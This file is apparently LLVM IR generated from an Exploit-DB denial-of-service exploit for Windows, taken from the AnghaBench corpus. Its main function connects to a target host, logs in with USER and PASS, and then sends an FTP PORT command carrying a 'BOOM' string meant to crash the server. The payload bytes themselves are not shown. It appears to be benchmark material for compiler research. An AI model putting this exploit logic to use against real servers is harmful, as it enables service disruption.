; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_1339.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_1339.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { %struct.TYPE_2__, i32, i32 }
%struct.TYPE_2__ = type { i32 }

@.str = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1
@L = common dso_local global i8* null, align 8
@HL = common dso_local global i8* null, align 8
@.str.1 = private unnamed_addr constant [28 x i8] c"Usage: %s <www.target.com>\0A\00", align 1
@.str.2 = private unnamed_addr constant [35 x i8] c"Error WSAStartup() Error Code: %d\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@IPPROTO_TCP = common dso_local global i32 0, align 4
@INVALID_SOCKET = common dso_local global i64 0, align 8
@.str.3 = private unnamed_addr constant [31 x i8] c"Error socket() Error Code: %d\0A\00", align 1
@PORT = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [32 x i8] c"Error connect() Error Code: %d\0A\00", align 1
@.str.5 = private unnamed_addr constant [6 x i8] c"USER \00", align 1
@USER = common dso_local global i8* null, align 8
@.str.6 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.7 = private unnamed_addr constant [6 x i8] c"PASS \00", align 1
@PASS = common dso_local global i8* null, align 8
@.str.8 = private unnamed_addr constant [6 x i8] c"PORT \00", align 1
@BOOM = common dso_local global i8* null, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i64, align 8
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca [400 x i8], align 16
  %13 = alloca [400 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %10, align 4
  %14 = load i32, i32* %4, align 4
  %15 = icmp slt i32 %14, 2
  br i1 %15, label %16, label %28

16:                                               ; preds = %2
  %17 = load i8*, i8** @L, align 8
  %18 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i64 0, i64 0), i8* %17)
  %19 = load i8*, i8** @HL, align 8
  %20 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i64 0, i64 0), i8* %19)
  %21 = load i8*, i8** @L, align 8
  %22 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i64 0, i64 0), i8* %21)
  %23 = load i8**, i8*** %5, align 8
  %24 = getelementptr inbounds i8*, i8** %23, i64 0
  %25 = load i8*, i8** %24, align 8
  %26 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.1, i64 0, i64 0), i8* %25)
  %27 = call i32 @exit(i32 0) #3
  unreachable

28:                                               ; preds = %2
  %29 = load i8*, i8** @L, align 8
  %30 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i64 0, i64 0), i8* %29)
  %31 = load i8*, i8** @HL, align 8
  %32 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i64 0, i64 0), i8* %31)
  %33 = load i8*, i8** @L, align 8
  %34 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i64 0, i64 0), i8* %33)
  %35 = call i32 @MAKEWORD(i32 2, i32 2)
  store i32 %35, i32* %9, align 4
  %36 = call i64 @WSAStartup(i32 %35, i32* %6)
  %37 = icmp ne i64 %36, 0
  br i1 %37, label %38, label %42

38:                                               ; preds = %28
  %39 = call i32 (...) @WSAGetLastError()
  %40 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.2, i64 0, i64 0), i32 %39)
  %41 = call i32 @exit(i32 1) #3
  unreachable

42:                                               ; preds = %28
  %43 = load i32, i32* @AF_INET, align 4
  %44 = load i32, i32* @SOCK_STREAM, align 4
  %45 = load i32, i32* @IPPROTO_TCP, align 4
  %46 = call i64 @socket(i32 %43, i32 %44, i32 %45)
  store i64 %46, i64* %7, align 8
  %47 = load i64, i64* %7, align 8
  %48 = load i64, i64* @INVALID_SOCKET, align 8
  %49 = icmp eq i64 %47, %48
  br i1 %49, label %50, label %54

50:                                               ; preds = %42
  %51 = call i32 (...) @WSAGetLastError()
  %52 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.3, i64 0, i64 0), i32 %51)
  %53 = call i32 @exit(i32 2) #3
  unreachable

54:                                               ; preds = %42
  %55 = load i32, i32* @AF_INET, align 4
  %56 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  store i32 %55, i32* %56, align 4
  %57 = load i32, i32* @PORT, align 4
  %58 = call i32 @htons(i32 %57)
  %59 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i32 %58, i32* %59, align 4
  %60 = load i8**, i8*** %5, align 8
  %61 = getelementptr inbounds i8*, i8** %60, i64 1
  %62 = load i8*, i8** %61, align 8
  %63 = call i32 @resolv_host(i8* %62)
  %64 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  %65 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %64, i32 0, i32 0
  store i32 %63, i32* %65, align 4
  %66 = load i64, i64* %7, align 8
  %67 = bitcast %struct.sockaddr_in* %8 to i32*
  %68 = call i64 @connect(i64 %66, i32* %67, i32 12)
  %69 = icmp ne i64 %68, 0
  br i1 %69, label %70, label %74

70:                                               ; preds = %54
  %71 = call i32 (...) @WSAGetLastError()
  %72 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.4, i64 0, i64 0), i32 %71)
  %73 = call i32 @exit(i32 3) #3
  unreachable

74:                                               ; preds = %54
  store i32 0, i32* %11, align 4
  %75 = load i64, i64* %7, align 8
  %76 = getelementptr inbounds [400 x i8], [400 x i8]* %12, i64 0, i64 0
  %77 = call i32 @recv(i64 %75, i8* %76, i32 399, i32 0)
  store i32 %77, i32* %11, align 4
  %78 = load i32, i32* %11, align 4
  %79 = sext i32 %78 to i64
  %80 = getelementptr inbounds [400 x i8], [400 x i8]* %12, i64 0, i64 %79
  store i8 0, i8* %80, align 1
  %81 = getelementptr inbounds [400 x i8], [400 x i8]* %13, i64 0, i64 0
  %82 = call i32 @strncpy(i8* %81, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.5, i64 0, i64 0), i32 399)
  %83 = getelementptr inbounds [400 x i8], [400 x i8]* %13, i64 0, i64 0
  %84 = load i8*, i8** @USER, align 8
  %85 = getelementptr inbounds [400 x i8], [400 x i8]* %13, i64 0, i64 0
  %86 = call i32 @strlen(i8* %85)
  %87 = sext i32 %86 to i64
  %88 = sub i64 400, %87
  %89 = sub i64 %88, 1
  %90 = trunc i64 %89 to i32
  %91 = call i32 @strncat(i8* %83, i8* %84, i32 %90)
  %92 = getelementptr inbounds [400 x i8], [400 x i8]* %13, i64 0, i64 0
  %93 = getelementptr inbounds [400 x i8], [400 x i8]* %13, i64 0, i64 0
  %94 = call i32 @strlen(i8* %93)
  %95 = sext i32 %94 to i64
  %96 = sub i64 400, %95
  %97 = sub i64 %96, 1
  %98 = trunc i64 %97 to i32
  %99 = call i32 @strncat(i8* %92, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.6, i64 0, i64 0), i32 %98)
  %100 = load i64, i64* %7, align 8
  %101 = getelementptr inbounds [400 x i8], [400 x i8]* %13, i64 0, i64 0
  %102 = getelementptr inbounds [400 x i8], [400 x i8]* %13, i64 0, i64 0
  %103 = call i32 @strlen(i8* %102)
  %104 = call i32 @send(i64 %100, i8* %101, i32 %103, i32 0)
  %105 = load i64, i64* %7, align 8
  %106 = getelementptr inbounds [400 x i8], [400 x i8]* %12, i64 0, i64 0
  %107 = call i32 @recv(i64 %105, i8* %106, i32 399, i32 0)
  store i32 %107, i32* %11, align 4
  %108 = load i32, i32* %11, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds [400 x i8], [400 x i8]* %12, i64 0, i64 %109
  store i8 0, i8* %110, align 1
  %111 = getelementptr inbounds [400 x i8], [400 x i8]* %13, i64 0, i64 0
  %112 = call i32 @strncpy(i8* %111, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.7, i64 0, i64 0), i32 399)
  %113 = getelementptr inbounds [400 x i8], [400 x i8]* %13, i64 0, i64 0
  %114 = load i8*, i8** @PASS, align 8
  %115 = getelementptr inbounds [400 x i8], [400 x i8]* %13, i64 0, i64 0
  %116 = call i32 @strlen(i8* %115)
  %117 = sext i32 %116 to i64
  %118 = sub i64 400, %117
  %119 = sub i64 %118, 1
  %120 = trunc i64 %119 to i32
  %121 = call i32 @strncat(i8* %113, i8* %114, i32 %120)
  %122 = getelementptr inbounds [400 x i8], [400 x i8]* %13, i64 0, i64 0
  %123 = getelementptr inbounds [400 x i8], [400 x i8]* %13, i64 0, i64 0
  %124 = call i32 @strlen(i8* %123)
  %125 = sext i32 %124 to i64
  %126 = sub i64 400, %125
  %127 = sub i64 %126, 1
  %128 = trunc i64 %127 to i32
  %129 = call i32 @strncat(i8* %122, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.6, i64 0, i64 0), i32 %128)
  %130 = load i64, i64* %7, align 8
  %131 = getelementptr inbounds [400 x i8], [400 x i8]* %13, i64 0, i64 0
  %132 = getelementptr inbounds [400 x i8], [400 x i8]* %13, i64 0, i64 0
  %133 = call i32 @strlen(i8* %132)
  %134 = call i32 @send(i64 %130, i8* %131, i32 %133, i32 0)
  %135 = load i64, i64* %7, align 8
  %136 = getelementptr inbounds [400 x i8], [400 x i8]* %12, i64 0, i64 0
  %137 = call i32 @recv(i64 %135, i8* %136, i32 399, i32 0)
  store i32 %137, i32* %11, align 4
  %138 = load i32, i32* %11, align 4
  %139 = sext i32 %138 to i64
  %140 = getelementptr inbounds [400 x i8], [400 x i8]* %12, i64 0, i64 %139
  store i8 0, i8* %140, align 1
  %141 = getelementptr inbounds [400 x i8], [400 x i8]* %13, i64 0, i64 0
  %142 = call i32 @strncpy(i8* %141, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.8, i64 0, i64 0), i32 399)
  %143 = getelementptr inbounds [400 x i8], [400 x i8]* %13, i64 0, i64 0
  %144 = load i8*, i8** @BOOM, align 8
  %145 = getelementptr inbounds [400 x i8], [400 x i8]* %13, i64 0, i64 0
  %146 = call i32 @strlen(i8* %145)
  %147 = sext i32 %146 to i64
  %148 = sub i64 400, %147
  %149 = sub i64 %148, 1
  %150 = trunc i64 %149 to i32
  %151 = call i32 @strncat(i8* %143, i8* %144, i32 %150)
  %152 = getelementptr inbounds [400 x i8], [400 x i8]* %13, i64 0, i64 0
  %153 = getelementptr inbounds [400 x i8], [400 x i8]* %13, i64 0, i64 0
  %154 = call i32 @strlen(i8* %153)
  %155 = sext i32 %154 to i64
  %156 = sub i64 400, %155
  %157 = sub i64 %156, 1
  %158 = trunc i64 %157 to i32
  %159 = call i32 @strncat(i8* %152, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.6, i64 0, i64 0), i32 %158)
  %160 = load i64, i64* %7, align 8
  %161 = getelementptr inbounds [400 x i8], [400 x i8]* %13, i64 0, i64 0
  %162 = getelementptr inbounds [400 x i8], [400 x i8]* %13, i64 0, i64 0
  %163 = call i32 @strlen(i8* %162)
  %164 = call i32 @send(i64 %160, i8* %161, i32 %163, i32 0)
  %165 = load i64, i64* %7, align 8
  %166 = call i32 @closesocket(i64 %165)
  %167 = call i32 (...) @WSACleanup()
  ret i32 0
}

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i64 @WSAStartup(i32, i32*) #1

declare dso_local i32 @MAKEWORD(i32, i32) #1

declare dso_local i32 @WSAGetLastError(...) #1

declare dso_local i64 @socket(i32, i32, i32) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @resolv_host(i8*) #1

declare dso_local i64 @connect(i64, i32*, i32) #1

declare dso_local i32 @recv(i64, i8*, i32, i32) #1

declare dso_local i32 @strncpy(i8*, i8*, i32) #1

declare dso_local i32 @strncat(i8*, i8*, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @send(i64, i8*, i32, i32) #1

declare dso_local i32 @closesocket(i64) #1

declare dso_local i32 @WSACleanup(...) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
